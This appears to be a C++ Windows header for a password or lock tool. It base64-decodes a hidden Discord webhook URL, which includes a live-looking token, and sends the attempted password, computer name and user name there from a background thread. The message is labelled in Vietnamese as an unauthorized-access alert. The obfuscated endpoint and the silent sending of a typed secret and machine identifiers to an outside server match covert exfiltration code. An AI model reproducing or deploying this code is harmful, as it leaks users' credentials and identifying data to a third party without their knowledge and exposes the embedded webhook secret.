#pragma once
#include <wininet.h>
#include <string>
#include <cstring>
#pragma comment(lib, "wininet.lib")

inline std::string B64D(const char* in) {
    int T[128];
    memset(T, -1, sizeof(T));
    const char* a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (int i = 0; a[i]; i++) T[(int)a[i]] = i;
    std::string o;
    int v = 0, b = -8;
    for (int i = 0; in[i]; i++) {
        int c = (unsigned char)in[i];
        if (c >= 128 || T[c] == -1) break;
        v = (v << 6) + T[c];
        b += 6;
        if (b >= 0) {
            o += (char)((v >> b) & 0xFF);
            b -= 8;
        }
    }
    return o;
}

inline std::string JEsc(const std::string& s) {
    std::string r;
    for (char c : s) {
        if (c == '"') { r += '\\'; r += '"'; }
        else if (c == '\\') { r += '\\'; r += '\\'; }
        else r += c;
    }
    return r;
}

struct WH_Data {
    std::string key, pc, usr;
};

inline DWORD WINAPI DirectWebhookThread(LPVOID p) {
    WH_Data* d = (WH_Data*)p;
    std::string url = B64D(
        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv"
        "MTU1MTU0NTY3NDU2OTYxMzMyMy9LVXpDT3c0UFIzU180"
        "TXZMSEtKVnd4aDBWX2p2aFZSVUcwMG1KdzZCSUpHcGI1"
        "VnVSdHJpNk5wQ2ZuU1ZZOFJsVUJONg==");

    size_t ps = url.find("/api/");
    std::string path = (ps != std::string::npos) ? url.substr(ps) : "/";

    char q = '"';
    std::string json;
    json += '{';
    json += q; json += "content"; json += q; json += ':';
    json += q;
    json += "**CANH BAO: TRUY CAP TRAI PHEP!** | Mat khau: `";
    json += JEsc(d->key);
    json += "` | May tinh: ";
    json += JEsc(d->pc);
    json += " / ";
    json += JEsc(d->usr);
    json += q;
    json += '}';

    HINTERNET h1 = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (h1) {
        HINTERNET h2 = InternetConnectA(h1, "discord.com", INTERNET_DEFAULT_HTTPS_PORT,
            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (h2) {
            DWORD fl = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
            HINTERNET h3 = HttpOpenRequestA(h2, "POST", path.c_str(), NULL, NULL, NULL, fl, 0);
            if (h3) {
                const char* hdr = "Content-Type: application/json\r\n";
                HttpSendRequestA(h3, hdr, -1, (LPVOID)json.c_str(), (DWORD)json.size());
                InternetCloseHandle(h3);
            }
            InternetCloseHandle(h2);
        }
        InternetCloseHandle(h1);
    }
    delete d;
    return 0;
}

inline void SendDirectWebhook(const std::wstring& attemptedKey) {
    WH_Data* wd = new WH_Data();

    int kl = WideCharToMultiByte(CP_UTF8, 0, attemptedKey.c_str(), -1, NULL, 0, NULL, NULL);
    if (kl > 1) {
        wd->key.resize(kl - 1);
        WideCharToMultiByte(CP_UTF8, 0, attemptedKey.c_str(), -1, &wd->key[0], kl, NULL, NULL);
    }

    char buf[256] = {};
    DWORD bl = sizeof(buf);
    GetComputerNameA(buf, &bl);
    wd->pc = buf;

    bl = sizeof(buf);
    GetUserNameA(buf, &bl);
    wd->usr = buf;

    CreateThread(NULL, 0, DirectWebhookThread, wd, 0, NULL);
}
